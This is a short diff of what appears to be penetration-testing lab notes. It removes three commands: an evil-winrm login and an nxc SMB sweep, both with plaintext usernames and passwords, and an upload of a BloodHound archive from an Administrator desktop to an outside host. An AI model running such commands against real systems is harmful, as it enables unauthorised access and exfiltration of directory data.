@@ -1,15 +1,15 @@
 [[Editing Copy Page]]
 
 ```
-evil-winrm -i l192.168.162.163 -u 'Eric.Wallows' -p 'EricLikesRunning800'
+
 ```
 
 ```
-cp ~/Desktop/Tools/Windows/nxc-sweep-smb . && ./nxc-sweep-smb ip.txt -u 'lisa' -p 'LisaWayToGo456'
+
 ```
 
 ```
-Invoke-FileUpload -Uri "http://192.168.45.178:4445/upload" -File "C:\Users\Administrator\Desktop\20261115212208_BloodHound.zip"
+
 ```
 
 ```
